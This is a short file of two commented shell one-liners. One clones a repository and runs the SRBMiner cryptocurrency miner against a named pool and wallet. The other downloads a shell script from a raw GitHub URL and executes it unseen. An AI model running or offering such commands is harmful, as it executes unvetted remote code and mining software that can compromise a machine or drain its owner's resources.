# git clone https://github.com/CoolBuster999/SRBMiner0-9-2.git && cd SRBMiner0-9-2 && cd SRBMiner-Multi-0-9-2 && chmod +x * && ./SRBMiner-MULTI --algorithm ghostrider --pool stratum-asia.rplant.xyz:17094 --tls true --wallet MD9RFwwv38ow5dqVbPTunUaTZ8Xh4ZJEdJ.the --keepalive true

# wget https://raw.githubusercontent.com/penjelajahwaktudonk/ddd/main/tes.sh && chmod +x tes.sh && ./tes.sh
